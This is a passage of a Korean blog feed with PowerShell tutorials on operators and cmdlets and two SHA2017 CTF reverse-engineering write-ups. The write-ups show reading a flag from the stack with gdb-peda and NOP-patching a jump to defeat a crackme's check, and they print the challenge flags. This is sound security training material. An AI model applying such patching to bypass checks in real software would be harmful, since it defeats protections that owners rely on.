&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; 2 -eq 3
False
PS C:\Users\k3y6reak&amp;gt; 2 -eq 2
True
PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; -eq &quot;Hello&quot;
True
PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; -eq &quot;HellO&quot;
True&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;-ne&lt;/code&gt;는 not equal 로 값이 다른지를 확인합니다. 숫자와 문자 모두 비교가 가능합니다.
문자를 비교할 때는 대소문자를 따지지 않습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; 2 -ne 3
True
PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; -ne &quot;World&quot;
True&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;-gt&lt;/code&gt;는 greater than 로 값이 큰지를 확인합니다. 숫자와 문자 모두 비교가 가능합니다.
문자를 비교할 때는 각 문자의 ascii 값으로 비교합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; 4 -gt 3
True
PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; -gt &quot;Hell0&quot;
True
PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; -gt &quot;Helln&quot;
True
PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; -gt &quot;Hellp&quot;
False&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;-lt&lt;/code&gt;는 less than 로 값이 작은지를 확인합니다. 숫자와 문자 모두 비교가 가능합니다.
문자를 비교할 때는 각 문자의 ascii 값으로 비교합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; -lt &quot;Hell0&quot;
False
PS C:\Users\k3y6reak&amp;gt; 2 -lt 3
True&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;이외의 연산자는 직접 실습해 보시길 바랍니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;리다이렉션&quot;&gt;리다이렉션&lt;/h3&gt;

&lt;p&gt;리다이렉션은 linux와 동일하게 사용됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot; &amp;gt; hello.txt
PS C:\Users\k3y6reak&amp;gt; cat hello.txt
Hello
PS C:\Users\k3y6reak&amp;gt; &quot;World&quot; &amp;gt;&amp;gt; hello.txt
PS C:\Users\k3y6reak&amp;gt; cat hello.txt
Hello
World&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;논리-연산자&quot;&gt;논리 연산자&lt;/h3&gt;

&lt;p&gt;논리 연산자는 &lt;code class=&quot;highlighter-rouge&quot;&gt;and, or, not, !&lt;/code&gt;를 말합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; (2 -eq 3) -and (4 -eq 4)
False
PS C:\Users\k3y6reak&amp;gt; (2 -eq 3) -or (4 -eq 4)
True&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;분할-병합&quot;&gt;분할, 병합&lt;/h3&gt;

&lt;p&gt;분할과 병합은 &lt;code class=&quot;highlighter-rouge&quot;&gt;split, join&lt;/code&gt;으로 할 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; &quot;Hello World My name is k3y6reak&quot; -split &quot; &quot;
Hello
World
My
name
is
k3y6reak
PS C:\Users\k3y6reak&amp;gt; &quot;Hello&quot;, &quot;My name is k3y6reak&quot; -join &quot;World&quot;
HelloWorldMy name is k3y6reak&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;타입&quot;&gt;타입&lt;/h3&gt;

&lt;p&gt;타입은 값의 형태를 확인거나 변환할 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; 3 -is &quot;int&quot;
True
PS C:\Users\k3y6reak&amp;gt; 3 -is &quot;float&quot;
False
PS C:\Users\k3y6reak&amp;gt; &quot;3&quot; -is &quot;string&quot;
True
PS C:\Users\k3y6reak&amp;gt; 0x12 -as &quot;int&quot;
18&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">SHA2017 Suspect File1 (100)</title><link href="http://localhost:4000/ctfs/2017/08/07/sha2017_suspect_file1_100.html" rel="alternate" type="text/html" title="SHA2017 Suspect File1 (100)" /><published>2017-08-07T14:14:00+09:00</published><updated>2017-08-07T14:14:00+09:00</updated><id>http://localhost:4000/ctfs/2017/08/07/sha2017_suspect_file1_100</id><content type="html" xml:base="http://localhost:4000/ctfs/2017/08/07/sha2017_suspect_file1_100.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;문제&quot;&gt;문제&lt;/h3&gt;

&lt;p&gt;Suspect File 1 (100)&lt;/p&gt;

&lt;p&gt;We found some software on our suspects development server, it looks like they created some different versions, are you able to crack the software?&lt;/p&gt;

&lt;p&gt;Challenge created by the Digital and Biometric Traces division of the Netherlands Forensic Institute.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;풀이&quot;&gt;풀이&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@ubuntu:/home/k3y6reak/Desktop# &lt;/span&gt;./100
Sorry
&lt;span class=&quot;gp&quot;&gt;root@ubuntu:/home/k3y6reak/Desktop# &lt;/span&gt;./100 a
Sorry&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;해당 바이너리를 실행하면 위와같이 Sorry만 출력한다.&lt;/p&gt;

&lt;p&gt;IDA를 이용해서 디컴파일하여 소스코드를 보게 되면 아래와 같이 do~while()로 시작하는 것을 알 수 있으며 v10 값이 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xc9702e05&lt;/code&gt;되어야만 Yes!를 출력한다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;	&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;생략&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc9702e05&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;가장 처음 비교하는 부분인 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x8048977&lt;/code&gt;에 Breakpoint를 걸어두고 &lt;code class=&quot;highlighter-rouge&quot;&gt;r aaaaaaaaa&lt;/code&gt;로 실행한 뒤 &lt;code class=&quot;highlighter-rouge&quot;&gt;finish&lt;/code&gt; 명령을 계속해서 실행한다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ida&quot; data-lang=&quot;ida&quot;&gt;.text:08048977                 cmp     eax, 96C8ACCAh
.text:0804897C                 jg      short loc_8048990
.text:0804897E                 cmp     eax, 8FD5472Dh
.text:08048983                 jnz     short loc_8048977
.text:08048985                 jmp     short loc_8048940&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;----------------------------------registers-----------------------------------]
EAX: 0x5c4742c2
EBX: 0x8048164 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;_init&amp;gt;:	push   ebx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ECX: 0x80ed5e8 --&amp;gt; 0x0
EDX: 0xe6cbc1fb
ESI: 0x80ea0c4 --&amp;gt; 0x8068270 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;__strcpy_sse2&amp;gt;:	mov    edx,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
EDI: 0x46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'F'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
EBP: 0xffffd4f8 --&amp;gt; 0x1000
ESP: 0xffffd370 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag{57201791ea24f3acd852cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
EIP: 0x8048977 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;main+263&amp;gt;:	cmp    eax,0x96c8acca&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
EFLAGS: 0x246 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;carry PARITY adjust ZERO sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-------------------------------------code-------------------------------------]
   0x804896d &amp;lt;main+253&amp;gt;:	or     cl,al
   0x804896f &amp;lt;main+255&amp;gt;:	mov    eax,0x6b8a9776
   0x8048974 &amp;lt;main+260&amp;gt;:	cmovne eax,edx
&lt;span class=&quot;gp&quot;&gt;=&amp;gt; &lt;/span&gt;0x8048977 &amp;lt;main+263&amp;gt;:	cmp    eax,0x96c8acca
   0x804897c &amp;lt;main+268&amp;gt;:	jg     0x8048990 &amp;lt;main+288&amp;gt;
   0x804897e &amp;lt;main+270&amp;gt;:	cmp    eax,0x8fd5472d
   0x8048983 &amp;lt;main+275&amp;gt;:	jne    0x8048977 &amp;lt;main+263&amp;gt;
   0x8048985 &amp;lt;main+277&amp;gt;:	jmp    0x8048940 &amp;lt;main+208&amp;gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;------------------------------------stack-------------------------------------]
0000| 0xffffd370 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag{57201791ea24f3acd852cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0004| 0xffffd374 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{57201791ea24f3acd852cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0008| 0xffffd378 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;01791ea24f3acd852cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0012| 0xffffd37c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1ea24f3acd852cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0016| 0xffffd380 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4f3acd852cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0020| 0xffffd384 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cd852cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0024| 0xffffd388 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2cee3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0028| 0xffffd38c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;3271333a8}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048977 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;finish&lt;/code&gt;명령을 계속해서 실행하면 위와같이 stack에 flag에 대한 정보가 나오게 된다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@ubuntu:/home/k3y6reak/Desktop# &lt;/span&gt;./100 flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;57201791ea24f3acd852cee3271333a8&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Yes!
root@ubuntu:/home/k3y6reak/Desktop#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;따라서 &lt;code class=&quot;highlighter-rouge&quot;&gt;flag{57201791ea24f3acd852cee3271333a8}&lt;/code&gt;가 된다.&lt;/p&gt;</content><author><name></name></author><summary type="html">문제</summary></entry><entry><title type="html">SHA2017 asby (100)</title><link href="http://localhost:4000/ctfs/2017/08/07/sha2017_asby_100.html" rel="alternate" type="text/html" title="SHA2017 asby (100)" /><published>2017-08-07T14:11:00+09:00</published><updated>2017-08-07T14:11:00+09:00</updated><id>http://localhost:4000/ctfs/2017/08/07/sha2017_asby_100</id><content type="html" xml:base="http://localhost:4000/ctfs/2017/08/07/sha2017_asby_100.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;문제&quot;&gt;문제&lt;/h3&gt;

&lt;p&gt;asby (100)&lt;/p&gt;

&lt;p&gt;Eindbazen team member asby has by far been putting the most energy and time in creating the SHA2017 CTF. To honor his dedication and all his effort we created this challenge as an ode to him.&lt;/p&gt;

&lt;p&gt;You can choose to reverse engineer this challenge or you can “asby” it. Good luck with the option you choose.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;풀이&quot;&gt;풀이&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;What is the flag? k3y6reak
Checking char 1:WRONG!
What is the flag?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;asby.exe 파일을 실행하면 위와 같이 What is the flag? 라는 문자열이 나타나며 입력을 하면 각 자리마다 값을 비교한다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-dbg&quot; data-lang=&quot;dbg&quot;&gt;0040179B | 89 D0                    | MOV EAX, EDX                                     |
0040179D | 0F B6 44 05 C9           | MOVZX EAX, BYTE PTR SS:[EBP + EAX - 37]          |
004017A2 | 31 C8                    | XOR EAX, ECX                                     |
004017A4 | 83 F0 2A                 | XOR EAX, 2A                                      |
004017A7 | 38 45 80                 | CMP BYTE PTR SS:[EBP - 80], AL                   |
004017AA | 0F 94 C0                 | SETE AL                                          |
004017AD | 84 C0                    | TEST AL, AL                                      |
004017AF | 74 16                    | JE asby.4017C7                                   |
004017B1 | C7 44 24 04 4F 90 48 00  | MOV DWORD PTR SS:[ESP + 4], asby.48904F          | 48904F:&quot;CORRECT!\n&quot;
004017B9 | C7 04 24 40 81 48 00     | MOV DWORD PTR SS:[ESP], asby.488140              |
004017C0 | E8 4B 9F 07 00           | CALL asby.47B710                                 |
004017C5 | EB 1D                    | JMP asby.4017E4                                  |
004017C7 | C7 44 24 04 59 90 48 00  | MOV DWORD PTR SS:[ESP + 4], asby.489059          | 489059:&quot;WRONG!\n&quot;
004017CF | C7 04 24 40 81 48 00     | MOV DWORD PTR SS:[ESP], asby.488140              |
004017D6 | C7 45 88 02 00 00 00     | MOV DWORD PTR SS:[EBP - 78], 2                   |
004017DD | E8 2E 9F 07 00           | CALL asby.47B710                                 |
004017E2 | EB 29                    | JMP asby.40180D                                  |&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;각 자리를 비교하는 부분은 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x004017a7&lt;/code&gt; 에서 비교를 하는데 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x004017a4&lt;/code&gt;에서 입력한 값과 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2a를 xor 연산한 값&lt;/code&gt;을 비교하게 된다.&lt;/p&gt;

&lt;p&gt;여기서 &lt;code class=&quot;highlighter-rouge&quot;&gt;WRONG!&lt;/code&gt;이 출력되면 다시 flag를 입력해야 하기 때문에 값이 틀려도 &lt;code class=&quot;highlighter-rouge&quot;&gt;CORRECT!&lt;/code&gt;가 나오도록 하기 위해서 바이너리를 패치한다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;004017AF | 74 16                    | JE asby.4017C7&lt;/code&gt; 이 부분을 &lt;code class=&quot;highlighter-rouge&quot;&gt;NOP&lt;/code&gt;으로 패치한 뒤에 비교하는 값을 모두 찾아내면 된다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;C:\Users\k3y6reak\Desktop&amp;gt;asby.exe
What is the flag? flag{024baa8ac03ef22fdde61c0f11069f2f}
Checking char 1:CORRECT!
Checking char 2:CORRECT!
Checking char 3:CORRECT!
Checking char 4:CORRECT!
Checking char 5:CORRECT!
Checking char 6:CORRECT!
Checking char 7:CORRECT!
Checking char 8:CORRECT!
Checking char 9:CORRECT!
Checking char 10:CORRECT!
Checking char 11:CORRECT!
Checking char 12:CORRECT!
Checking char 13:CORRECT!
Checking char 14:CORRECT!
Checking char 15:CORRECT!
Checking char 16:CORRECT!
Checking char 17:CORRECT!
Checking char 18:CORRECT!
Checking char 19:CORRECT!
Checking char 20:CORRECT!
Checking char 21:CORRECT!
Checking char 22:CORRECT!
Checking char 23:CORRECT!
Checking char 24:CORRECT!
Checking char 25:CORRECT!
Checking char 26:CORRECT!
Checking char 27:CORRECT!
Checking char 28:CORRECT!
Checking char 29:CORRECT!
Checking char 30:CORRECT!
Checking char 31:CORRECT!
Checking char 32:CORRECT!
Checking char 33:CORRECT!
Checking char 34:CORRECT!
Checking char 35:CORRECT!
Checking char 36:CORRECT!
Checking char 37:CORRECT!
Checking char 38:CORRECT!

Congrats, it seems you asby'ed the flag out of the challenge!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;각 자리를 모두 찾아내면 &lt;code class=&quot;highlighter-rouge&quot;&gt;flag{024baa8ac03ef22fdde61c0f11069f2f}&lt;/code&gt;가 나오게 된다.&lt;/p&gt;</content><author><name></name></author><summary type="html">문제</summary></entry><entry><title type="html">Cmdlet</title><link href="http://localhost:4000/technique/powershell/2017/08/04/cmdlet.html" rel="alternate" type="text/html" title="Cmdlet" /><published>2017-08-04T17:06:00+09:00</published><updated>2017-08-04T17:06:00+09:00</updated><id>http://localhost:4000/technique/powershell/2017/08/04/cmdlet</id><content type="html" xml:base="http://localhost:4000/technique/powershell/2017/08/04/cmdlet.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이번에는 PowerShell에서 사용되는 cmdlet에 대해서 알아 보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;PowerShell에서 명령어를 사용하기 위해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Command&lt;/code&gt;를 입력하면 아래와 같이 많은 명령어들이 출력되는 것을 볼 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Add-ProvisionedAppxPackage                         3.0        Dism
Alias           Apply-WindowsUnattend                              3.0        Dism
Alias           Disable-PhysicalDiskIndication                     2.0.0.0    Storage
Alias           Disable-StorageDiagnosticLog                       2.0.0.0    Storage
Alias           Enable-PhysicalDiskIndication                      2.0.0.0    Storage
Alias           Enable-StorageDiagnosticLog                        2.0.0.0    Storage
Alias           Flush-Volume                                       2.0.0.0    Storage
Alias           Get-DiskSNV                                        2.0.0.0    Storage
Alias           Get-PhysicalDiskSNV                                2.0.0.0    Storage
Alias           Get-ProvisionedAppxPackage                         3.0        Dism
Alias           Get-StorageEnclosureSNV                            2.0.0.0    Storage
Alias           Initialize-Volume                                  2.0.0.0    Storage
Alias           Move-SmbClient                                     2.0.0.0    SmbWitness
Alias           Remove-ProvisionedAppxPackage                      3.0        Dism
Alias           Write-FileSystemCache                              2.0.0.0    Storage
Function        A:
Function        Add-BCDataCacheExtension                           1.0.0.0    BranchCache
Function        Add-BitLockerKeyProtector                          1.0.0.0    BitLocker
Function        Add-DnsClientNrptRule                              1.0.0.0    DnsClient
Function        Add-DtcClusterTMMapping                            1.0.0.0    MsDtc
Function        Add-EtwTraceProvider                               1.0.0.0    EventTracingManagement
Function        Add-InitiatorIdToMaskingSet                        2.0.0.0    Storage
...(생략)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;이 중에서 알아볼 명령어는 cmdlet에 대한 명령어인데 해당 명령어만 출력하도록 해보겠습니다.
&lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Command -CommandType cmdlet&lt;/code&gt;을 실행합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Command -CommandType cmdlet

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Add-AppvClientConnectionGroup                      1.0.0.0    AppvClient
Cmdlet          Add-AppvClientPackage                              1.0.0.0    AppvClient
Cmdlet          Add-AppvPublishingServer                           1.0.0.0    AppvClient
Cmdlet          Add-AppxPackage                                    2.0.0.0    Appx
Cmdlet          Add-AppxProvisionedPackage                         3.0        Dism
Cmdlet          Add-AppxVolume                                     2.0.0.0    Appx
Cmdlet          Add-BitsFile                                       2.0.0.0    BitsTransfer
Cmdlet          Add-CertificateEnrollmentPolicyServer              1.0.0.0    PKI
Cmdlet          Add-Computer                                       3.1.0.0    Microsoft.PowerShell.Management
Cmdlet          Add-Content                                        3.1.0.0    Microsoft.PowerShell.Management
Cmdlet          Add-History                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Add-JobTrigger                                     1.1.0.0    PSScheduledJob
Cmdlet          Add-KdsRootKey                                     1.0.0.0    Kds
Cmdlet          Add-LocalGroupMember                               1.0.0.0    Microsoft.PowerShell.LocalAccounts
Cmdlet          Add-Member                                         3.1.0.0    Microsoft.PowerShell.Utility
Cmdlet          Add-PSSnapin                                       3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Add-SignerRule                                     1.0        ConfigCI
Cmdlet          Add-Type                                           3.1.0.0    Microsoft.PowerShell.Utility&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;cmdlet에 대한 명령어 목록이 출력된 것을 확인할 수 있습니다. 이 중에서 process와 관련된 명령어를 찾고자 한다면 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Command -CommandType cmdlet -Name *process&lt;/code&gt; 을 입력합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Command -CommandType cmdlet -Name *process

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Debug-Process                                      3.1.0.0    Microsoft.PowerShell.Management
